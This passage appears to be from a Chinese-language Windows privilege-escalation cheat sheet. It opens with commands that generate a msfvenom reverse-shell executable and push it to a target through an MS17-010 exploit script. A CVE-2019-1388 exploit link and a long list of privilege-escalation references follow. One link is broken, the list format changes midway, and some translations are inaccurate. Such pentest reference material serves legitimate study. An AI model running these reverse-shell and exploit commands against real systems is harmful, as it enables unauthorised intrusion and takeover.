exploit/windows/smb/ms17_010_psexec           MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB远程Windows代码执行
```

如果您不能使用Metasploit且只需要一个反向Shell。

```powershell
git clone https://github.com/helviojunior/MS17-010

# 生成一个简单的反向Shell供使用
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o revshell.exe
python2 send_and_execute.py 10.0.0.1 revshell.exe
```

### CVE-2019-1388

漏洞利用：https://packetstormsecurity.com/files/14437/hhupd.exe.html

要求：

- Windows 7
- Windows 10 LTSC 10240

在以下系统上失败：

- LTSC 2019
- 1709
- 1803

关于漏洞的详细信息：https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege

## 参考资料

* [icacls - Microsoft文档](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls)
* [Windows权限提升 - Philip Linghammar](https://web.archive.org/web/20191231011305/https://xapax.gitbooks.io/security/content/privilege_escalation_windows.html)
* [Windows权限提升 - Guifre Ruiz](https://guif.re/windowseop)
* [amAK.xyz和@xxByte的开放源代码Windows权限提升备忘单](https://addaxsoft.com/wpecs/)

**Linux基本权限提升**
- [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

**Windows权限提升基础**
- [Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html)

**提升在Windows系统中权限的十大方式 - hackmag**
- [TOP–10 ways to boost your privileges in Windows systems - hackmag](https://hackmag.com/security/elevating-privileges-to-administrative-and-further/)

**系统挑战**
- [The SYSTEM Challenge](https://decoder.cloud/2017/02/21/the-system-challenge/)

**Windows权限提升指南 - absolomb的安全博客**
- [Windows Privilege Escalation Guide - absolomb's security blog](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)

**第四章 - Windows后渗透 - 2017年11月2日 - dostoevskylabs**
- [Chapter 4 - Windows Post-Exploitation - 2 Nov 2017 - dostoevskylabs](https://github.com/dostoevskylabs/dostoevsky-pentest-notes/blob/master/chapter-4.md)

**微软Windows未引用服务路径枚举漏洞修复 - 2016年9月18日 - 罗伯特·拉塞尔**
- [Remediation for Microsoft Windows Unquoted Service Path Enumeration Vulnerability - September 18th, 2016 - Robert Russell](https://www.tecklyfe.com/remediation-microsoft-windows-unquoted-service-path-enumeration-vulnerability/)

**Pentestlab.blog - WPE-01 - 存储的凭据**
- [Pentestlab.blog - WPE-01 - Stored Credentials](https://pentestlab.blog/2017/04/19/stored-credentials/)

**Pentestlab.blog - WPE-02 - Windows内核**
- [Pentestlab.blog - WPE-02 - Windows Kernel](https://pentestlab.blog/2017/04/24/windows-kernel-exploits/)

**Pentestlab.blog - WPE-03 - DLL注入**
- [Pentestlab.blog - WPE-03 - DLL Injection

- [Pentestlab.blog - WPE-04 - Weak Service Permissions](https://pentestlab.blog/2017/03/30/weak-service-permissions/)描述了Windows服务权限弱点的利用方法。

  - [Pentestlab.blog - WPE-05 - DLL Hijacking](https://pentestlab.blog/2017/03/27/dll-hijacking/)

  - 讨论了通过DLL劫持来提升权限的技巧。

  - [Pentestlab.blog - WPE-06 - Hot Potato](https://pentestlab.blog/2017/04/13/hot-potato/)
    - 介绍了一种利用Windows热点土豆技术进行权限提升的方法。

  - [Pentestlab.blog - WPE-07 - Group Policy Preferences](https://pentestlab.blog/2017/03/20/group-policy-preferences/)
    - 分析了如何通过组策略首选项来操纵系统设置以提升权限。

  - [Pentestlab.blog - WPE-08 - Unquoted Service Path](https://pentestlab.blog/2017/03/09/unquoted-service-path/)
    - 讨论了未引用服务路径的安全风险及其利用方法。

  - [Pentestlab.blog - WPE-09 - Always Install Elevated](https://pentestlab.blog/2017/02/28/always-install-elevated/)
    - 介绍了通过始终安装提升权限的方式来进行权限提升的攻击。

  - [Pentestlab.blog - WPE-10 - Token Manipulation](https://pentestlab.blog/2017/04/03/token-manipulation/)
    - 描述了令牌操纵技术，用于在Windows系统中提升权限。

  - [Pentestlab.blog - WPE-11 - Secondary Logon Handle](https://pentestlab.blog/2017/04/07/secondary-logon-handle/)
    - 讨论了如何使用次级登录句柄来获取更高权限。

  - [Pentestlab.blog - WPE-12 - Insecure Registry Permissions](https://pentestlab.blog/2017/03/31/insecure-registry-permissions/)
    - 分析了不安全的注册表权限如何被利用来提升权限。

  - [Pentestlab.blog - WPE-13 - Intel SYSRET](https://pentestlab.blog/2017/06/14/intel-sysret/)
    - 介绍了利用Intel SYSRET指令进行权限提升的技术。

  - [Alternative methods of becoming SYSTEM - 20th November 2017 - Adam Chester @_xpn_](https://blog.xpnsec.com/becoming-system/)
    - 探讨了成为SYSTEM用户的替代方法。

  - [Living Off The Land Binaries and Scripts (and now also Libraries)](https://github.com/LOLBAS-Project/LOLBAS)
    - GitHub项目，提供了利用Windows本地二进制文件和脚本进行渗透测试的资源。

  - [Common Windows Misconfiguration: Services - 2018-09-23 - @am0nsec](https://web.archive.org/web/20191105182846/https://amonsec.net/2018/09/23/Common-Windows-Misconfiguration-Services.html)
    - 讨论了常见的Windows服务配置错误。

  - [Local Privilege Escalation Workshop - Slides.pdf - @sagishahar](https://github.com/sagishahar/lpeworkshop/blob/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf)
    - 提供了一个本地权限提升研讨会的幻灯片。

  - [Abusing Diaghub - xct - March 07, 2019](https://vulndev.io/2019/03/06/abusing-diaghub/)
    - 介绍了如何滥用Diaghub进行权限提升。

  - [Windows Exploitation Tricks: Exploiting Arbitrary File Writes for Local Elevation of Privilege - James Forshaw, Project Zero - Wednesday, April 18, 2018](https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html)
    - 由Google Project Zero的James Forshaw撰写的关于利用任意文件写入进行本地权限提升的技巧。

  - [Weaponizing Privileged File Writes with the USO Service - Part 2/2 - itm4n - August 19, 2019](https://itm4n.github.io/usodllloader-part2/)
    - 描述了如何使用USO服务将特权文件写入武器化以进行权限提升。

  - [Hacking Trick: Environment Variable $Path Interception y Escaladas de Privilegios para Windows](https://www.elladodelmal.com/2020/03/hacking-trick-environment-variable-path.html?m=1)
    - 介绍了一种通过环境变量$Path拦截来提升Windows权限的黑客技巧。

  - [Abusing SeLoadDriverPrivilege for privilege escalation - 14 JUN 2018 - OSCAR MALLO](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
    - 讨论了如何滥用SeLoadDriverPrivilege权限进行权限提升。

  - [Universal Privilege Escalation and Persistence – Printer - AUGUST 2, 2021](https://pentestlab.blog/2021/08/02/universal-privilege-escalation-and-persistence-printer/)
    - 介绍了一种通过打印机实现通用权限提升和持久化的方法。

  - [ABUSING ARBITRARY FILE DELETES TO ESCALATE PRIVILEGE AND OTHER GREAT TRICKS - March 17, 2022 | Simon Zuckerbraun](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
    - 讨论了如何通过滥用任意文件删除功能来提升权限以及其他技巧。

  - [Bypassing AppLocker by abusing HashInfo - 2022-08-19 - Ian](https://shells.systems/post-bypassing-applocker-by-abusing-hashinfo/)
    - 介绍了一种通过滥用HashInfo来绕过AppLocker的方法。

  - [Giving JuicyPotato a second chance: JuicyPotatoNG - @decoder_it, @splinter_code](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
    - 讲述了JuicyPotatoNG的相关信息，它是JuicyPotato的升级版。

  - [IN THE POTATO FAMILY, I WANT THEM ALL - @BlWasp_](https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all)
    - 提供了关于Potato家族的信息。

  - [Potatoes - Windows Privilege Escalation - Jorge Lajara - November 22, 2020](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
    - 讨论了Windows权限提升中的Potatoes技术。

  - [MSIFortune - LPE with MSI Installers - Oct 3, 2023 - PfiatDe](https://badoption.eu/blog/2023/10/03/MSIFortune.html)
    - 介绍了使用MSI安装程序进行本地权限提升（LPE）的方法。

  - [MSI Shenanigans. Part 1 – Offensive Capabilities Overview - DECEMBER 8, 2022 - Mariusz Banach](https://mgeeky.tech/msi-shenanigans-part-1/)
    - 提供了关于MSI安装程序攻击能力的概述。

  - [Escalating Privileges via Third-Party Windows Installers - ANDREW OLIVEAU - JUL 19, 2023](https://www.mandiant.com/resources/blog/privileges-third-party-windows-installers)
    - 讨论了通过第三方Windows安装程序提升权限的方法。

  - [Deleting Your Way Into SYSTEM: Why Arbitrary File Deletion Vulnerabilities Matter - ANDREW OLIVEAU - SEP 11, 2023](https://www.mandiant.com/resources/blog/arbitrary-file-deletion-vulnerabilities)
    - 强调了任意文件删除漏洞在权限提升中的重要性。